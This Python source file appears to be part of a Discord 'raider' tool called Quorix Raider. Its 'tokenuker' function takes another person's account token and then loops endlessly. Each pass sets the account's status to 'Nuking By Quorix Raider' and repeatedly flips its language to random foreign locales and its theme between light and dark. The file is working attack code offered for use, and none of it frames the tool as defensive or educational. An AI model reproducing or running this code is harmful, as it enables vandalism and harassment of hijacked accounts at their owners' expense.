async def check_token(session, token):
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    async with session.get('https://discord.com/api/v8/users/@me', headers=headers) as r:
        if r.status != 200:
            ErrorToken()
            return False
        return True

async def update_status(session, token, status):
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    payload = {"custom_status": {"text": status}}
    async with session.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=payload) as r:
        if r.status == 200:
            print(f"                                        {white}({green}+{white}) {green} STATUS CHANGED {white} | {status} {Fore.LIGHTBLACK_EX}~> 200 ")
        else:
            print(f"                                         {Fore.WHITE}({Fore.RED}+{Fore.WHITE}) {Fore.RED} STATUS NOT CHANGED {Fore.WHITE}  | {status} {Fore.LIGHTBLACK_EX}~> 404")

async def update_language(session, token):
    random_language = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    payload = {'locale': random_language}
    async with session.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=payload) as r:
        if r.status == 200:
            print(f"                                        {white}({green}+{white}) {green} LANGUAGE CHANGED {white} | {random_language} {Fore.LIGHTBLACK_EX}~> 200 ")
        else:
            print(f"                                         {Fore.WHITE}({Fore.RED}+{Fore.WHITE}) {Fore.RED} LANGUAGE NOT CHANGED {Fore.WHITE}  | {random_language} {Fore.LIGHTBLACK_EX}~> 404")

async def update_theme(session, token, modes):
    theme = next(modes)
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    payload = {'theme': theme}
    async with session.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=payload) as r:
        if r.status == 200:
            print(f"                                        {white}({green}+{white}) {green} THEME CHANGED {white} | {theme} {Fore.LIGHTBLACK_EX}~> 200 ")
        else:
            print(f"                                         {Fore.WHITE}({Fore.RED}+{Fore.WHITE}) {Fore.RED} THEME NOT CHANGED {Fore.WHITE}  | {theme} {Fore.LIGHTBLACK_EX}~> 404")

async def tokenuker():
    token = input(f"                                        {white}({green}+{white}) {L1} Enter Token > {Fore.LIGHTBLACK_EX}[HIDDEN INPUT]{RESET}{Fore.BLACK} ")

    async with aiohttp.ClientSession() as session:
        if not await check_token(session, token):
            return

        default_status = "Nuking By Quorix Raider"
        custom_status_input = input(f"                                        {hash} Custom Status > ")
        custom_status = f"{custom_status_input} ~> Service Used By Quorix Raider"
        modes = cycle(["light", "dark"])

        while True:
            await update_status(session, token, default_status)
            
            tasks = []
            for _ in range(5):
                tasks.append(update_language(session, token))
                tasks.append(update_theme(session, token, modes))
            await asyncio.gather(*tasks)
            
            await update_status(session, token, custom_status)
            
            tasks = []
            for _ in range(5):
                tasks.append(update_language(session, token))
                tasks.append(update_theme(session, token, modes))
            await asyncio.gather(*tasks)

            await asyncio.sleep(0.5)
